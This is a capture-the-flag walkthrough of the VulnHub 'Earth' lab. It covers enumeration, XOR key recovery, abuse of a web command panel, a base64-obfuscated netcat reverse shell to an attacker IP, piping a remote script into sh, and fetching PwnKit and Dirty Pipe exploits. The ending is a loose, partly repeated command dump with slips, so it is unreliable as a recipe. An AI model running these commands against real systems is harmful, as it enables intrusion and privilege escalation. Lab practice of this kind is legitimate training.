https://www.vulnhub.com/entry/the-planets-earth,755/

## Description:

This is an easy challenge
The goal is to gain root access by any means necessary (except actually hacking the VM server or player).
The goal of these games is to teach you the fundamental tools and strategies for assessing and exploiting vulnerabilities.
There are a variety of approaches to completing the challenges.

### stage one - enumeration:

first we need to find the machine - which is a vmware workstation image

so quick nmap scan
nmap 192.168.1.0/24

so:
Nmap scan report for earth.fritz.box (192.168.1.102)
Host is up (0.00037s latency).
Not shown: 858 filtered tcp ports (no-response), 139 filtered tcp ports (admin-prohibited)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
MAC Address: 08:00:27:DF:AC:A3 (Oracle VirtualBox virtual NIC)

so this box is going to be a webvuln box

access http://192.168.1.102 - just gives bad request and a default page on https

lets run nikto thru it to see what we get back

nikto -h 192.168.1.102

### result 

nikto -h 192.168.1.102
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.102
+ Target Hostname:    192.168.1.102
+ Target Port:        80
+ Start Time:         2022-03-18 11:57:17 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Cookie csrftoken created without the httponly flag
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8723 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2022-03-18 11:58:52 (GMT-4) (95 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested


      *********************************************************************
      Portions of the server's headers (Python/3.9 mod_wsgi/4.7.1 Apache/2.4.51) are not in
      the Nikto 2.1.6 database or are newer than the known string. Would you like
      to submit this information (*no server specific data*) to CIRT.net
      for a Nikto update (or you may email to sullo@cirt.net) (y/n)? y

+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The site uses SSL and Expect-CT header is not present.
- Sent updated info to cirt.net -- Thank you!

not a lot to be fair. version of apache is farly new - so no vulns there

lets see what other files are on the webserver?
gobuster dir -u http://192.168.1.102 -x html,txt,php,bak --wordlist=/usr/share/wordlists/dirb/common.txt
that didnt give me anything!

so let go back to the ssl site
and check out the cert i get the following:
DNS Name
earth.local
DNS Name
terratest.earth.local

so lets add these to the hostname file
and now we get a website - which is a messaging service 

└─# gobuster dir -u https://earth.local -x html,txt,php,bak --wordlist=/usr/share/wordlists/dirb/common.txt -k
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://earth.local
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              bak,html,txt,php
[+] Timeout:                 10s
===============================================================
2022/03/18 12:17:30 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 0] [--> /admin/]
/cgi-bin/.html        (Status: 403) [Size: 199]            
/cgi-bin/             (Status: 403) [Size: 199]   

so there is a admin page!
http://terratest.earth.local/admin/login

now nkito didnt pickup a robots file. so lets try manually

curl https://terratest.earth.local/robots.txt

so this returns:
User-Agent: *
Disallow: /*.asp
Disallow: /*.aspx
Disallow: /*.bat
Disallow: /*.c
Disallow: /*.cfm
Disallow: /*.cgi
Disallow: /*.com
Disallow: /*.dll
Disallow: /*.exe
Disallow: /*.htm
Disallow: /*.html
Disallow: /*.inc
Disallow: /*.jhtml
Disallow: /*.jsa
Disallow: /*.json
Disallow: /*.jsp
Disallow: /*.log
Disallow: /*.mdb
Disallow: /*.nsf
Disallow: /*.php
Disallow: /*.phtml
Disallow: /*.pl
Disallow: /*.reg
Disallow: /*.sh
Disallow: /*.shtml
Disallow: /*.sql
Disallow: /*.txt
Disallow: /*.xml
Disallow: /testingnotes.*

the last item is intresting - let check it out (guessing its a txt file)

curl --insecure -I https://terratest.earth.local/testingnotes.txt

esting secure messaging system notes:
*Using XOR encryption as the algorithm, should be safe as used in RSA.
*Earth has confirmed they have received our sent messages.
*testdata.txt was used to test encryption.
*terra used as username for admin portal.
Todo:
*How do we send our monthly keys to Earth securely? Or should we change keys weekly?
*Need to test different key lengths to protect against bruteforce. How long should the key be?
*Need to improve the interface of the messaging interface and the admin panel, it's currently very basic.


so. now we have the user name - terra

and xor used 

so using cyberchef:
https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'UTF8','string':'According%20to%20radiometric%20dating%20estimation%20and%20other%20evidence,%20Earth%20formed%20over%204.5%20billion%20years%20ago.%20Within%20the%20first%20billion%20years%20of%20Earth%5C's%20history,%20life%20appeared%20in%20the%20oceans%20and%20began%20to%20affect%20Earth%5C's%20atmosphere%20and%20surface,%20leading%20to%20the%20proliferation%20of%20anaerobic%20and,%20later,%20aerobic%20organisms.%20Some%20geological%20evidence%20indicates%20that%20life%20may%20have%20arisen%20as%20early%20as%204.1%20billion%20years%20ago'%7D,'Standard',false)&input=MjQwMjExMWIxYTA3MDUwNzBhNDEwMDBhNDMxYTAwMGEwZTBhMGYwNDEwNDYwMTE2NGQwNTBmMDcwYzBmMTU1NDBkMTAxODAwMDAwMDAwMGMwYzA2NDEwZjA5MDE0MjBlMTA1YzBkMDc0ZDA0MTgxYTAxMDQxYzE3MGQ0ZjRjMmMwYzEzMDAwZDQzMGUwZTFjMGEwMDA2NDEwYjQyMGQwNzRkNTU0MDQ2NDUwMzFiMTgwNDBhMDMwNzRkMTgxMTA0MTExYjQxMGYwMDBhNGM0MTMzNWQxYzFkMDQwZjRlMDcwZDA0NTIxMjAxMTExZjFkNGQwMzFkMDkwZjAxMGUwMDQ3MWMwNzAwMTY0NzQ4MWEwYjQxMmIxMjE3MTUxYTUzMWI0MzA0MDAxZTE1MWIxNzFhNDQ0MTAyMGUwMzA3NDEwNTQ0MTgxMDBjMTMwYjE3NDUwODFjNTQxYzBiMDk0OTAyMDIxMTA0MGQxYjQxMGYwOTAxNDIwMzAxNTMwOTFiNGQxNTAxNTMwNDA3MTQxMTBiMTc0YzJjMGMxMzAwMGQ0NDFiNDEwZjEzMDgwZDEyMTQ1YzBkMDcwODQxMGYxZDAxNDEwMTAxMWEwNTBkMGEwODRkNTQwOTA2MDkwNTA3MDkwMjQyMTUwYjE0MWMxZDA4NDExZTAxMGEwZDFiMTIwZDExMGQxZDA0MGUxYTQ1MGMwZTQxMGYwOTA0MDcxMzBiNTYwMTE2NGQwMDAwMTc0OTQxMWUxNTFjMDYxZTQ1NGQwMDExMTcwYzBhMDgwZDQ3MGExMDA2MDU1YTAxMDYwMDEyNDA1MzM2MGUxZjExNDgwNDA5MDYwMTBlMTMwYzAwMDkwZDRlMDIxMzBiMDUwMTVhMGIxMDRkMDgwMDE3MGMwMjEzMDAwZDEwNGMxZDA1MDAwMDQ1MGYwMTA3MGI0NzA4MDMxODQ0NWMwOTAzMDg0MTBmMDEwYzEyMTcxYTQ4MDIxZjQ5MDgwMDA2MDkxYTQ4MDAxZDQ3NTE0YzUwNDQ1NjAxMTkwMTA4MDExZDQ1MTgxNzE1MWExMDRjMDgwYTBlNWE

outputs:
earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclima.

so guessing thats:

earthclimatechangebad4humans

so that then prompts:
Welcome terra, run your CLI command on Earth Messaging Machine (use with care). 

so here im guessing it can run commands - lets try cat /etc/passwd

so that outputs full passwd file:
Command output: 
root:x:0:0:root:/root:/bin/bash 
bin:x:1:1:bin:/bin:/sbin/nologin 
daemon:x:2:2:daemon:/sbin:/sbin/nologin 
adm:x:3:4:adm:/var/adm:/sbin/nologin 
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin 
sync:x:5:0:sync:/sbin:/bin/sync 
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown 
halt:x:7:0:halt:/sbin:/sbin/halt 
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin 
operator:x:11:0:operator:/root:/sbin/nologin 
games:x:12:100:games:/usr/games:/sbin/nologin 
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin 
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin 
systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin 
systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin 
systemd-oom:x:998:996:systemd Userspace OOM Killer:/:/sbin/nologin 
systemd-timesync:x:997:995:systemd Time Synchronization:/:/sbin/nologin 
dbus:x:81:81:System message bus:/:/sbin/nologin 
polkitd:x:996:994:User for polkitd:/:/sbin/nologin 
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin 
cockpit-ws:x:995:991:User for cockpit web service:/nonexisting:/sbin/nologin cockpit-wsinstance:x:994:990:User for cockpit-ws instances:/nonexisting:/sbin/nologin tss:x:59:59:Account used for TPM access:/dev/null:/sbin/nologin abrt:x:173:173::/etc/abrt:/sbin/nologin setroubleshoot:x:993:989::/var/lib/setroubleshoot:/sbin/nologin rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin dnsmasq:x:992:988:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin chrony:x:991:987::/var/lib/chrony:/sbin/nologin 
tcpdump:x:72:72::/:/sbin/nologin systemd-network:x:985:985:systemd Network Management:/:/usr/sbin/nologin unbound:x:984:984:Unbound DNS resolver:/etc/unbound:/sbin/nologin 
clevis:x:983:983:Clevis Decryption Framework unprivileged user:/var/cache/clevis:/usr/sbin/nologin 
earth:x:1000:1000::/home/earth:/bin/bash 
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin 

so lets try change root password:

echo "password" | passwd --stdin root

these didnt work!
echo "password" | passwd --stdin earth
echo -e "password\npassword" | passwd earth

if i just type: passwd

then i get "Changing password for user apache"
so these commands only run as apache, and apache has no login!


ok, so lets try reverse shell - netcat is the easiest (hopefully)
Command output: Ncat 7.80 - so its installed on the server

so running: nc -e /bin/sh 10.0.0.1 4242

i get: Remote connections are forbidden

so i need to hide the command maybe?

## net cat

so lets base64 it:
echo 'nc -e /bin/bash 192.168.1.97 6556' | base64                                                       
bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMS45NyA2NTU2Cg==
echo bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMS45NyA2NTU2Cg== | base64 -d | bash

then start nc on kali
nc -nlvp 6556

upgrade terminal:
python -c 'import pty; pty.spawn("/bin/bash")'







then back on earth decode and run:
echo bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMS45NyA2NTU2Cg== | base64 -d | bash

that connects and we have shell:

whoami 
apache

so again still at apache. need to escalate

so lets run:

curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

Vulnerable to CVE-2021-4034

Vulnerable to CVE-2022-0847
https://github.com/arthepsy/CVE-2021-4034/blob/0e48795ab0a36b1d6ce1b96ea1ed7d529618845b/cve-2021-4034-poc.c
cd /tmp
curl https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c --output cve-2021-4034-poc.c
ls
gcc cve-2021-4034-poc.c -o cve-2021-4034-poc
./cve-2021-4034-poc.c

cd /tmp
curl https://raw.githubusercontent.com/cyberark/PwnKit-Hunter/main/CVE-2021-4034_Finder.py --output CVE-2021-4034_Finder.py
ls
c
cd /tmp
curl https://raw.githubusercontent.com/basharkey/CVE-2022-0847-dirty-pipe-checker/main/dpipe.sh --output dpipe.sh

https://github.com/basharkey/CVE-2022-0847-dirty-pipe-checker

cd /tmp
curl https://raw.githubusercontent.com/basharkey/CVE-2022-0847-dirty-pipe-checker/main/dpipe.sh --output dpipe.sh
ls 

https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
cd /tmp
curl https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/compile.sh --output compile.sh
curl https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-1.c --output exploit-1.c
curl https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/blob/main/exploit-2.c --output  exploit-2.c
ls
chmod +x compile.sh
./compile.sh

cd /tmp
curl https://haxx.in/files/dirtypipez.c --output dirtypipez.c
gcc  dirtypipez.c -o dirtypipez
chmod +x *
find /usr/sbin -perm /4000

./dirtypipez /usr/sbin/unix_chkpwd

cd /tmp
curl https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py --output linuxprivchecker.py
chmod +x linuxprivchecker.py
./linuxprivchecker.py



curl https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl --output linux-exploit-suggester-2.pl 
chmod +x linux-exploit-suggester-2.pl
./linux-exploit-suggester-2.pl 



















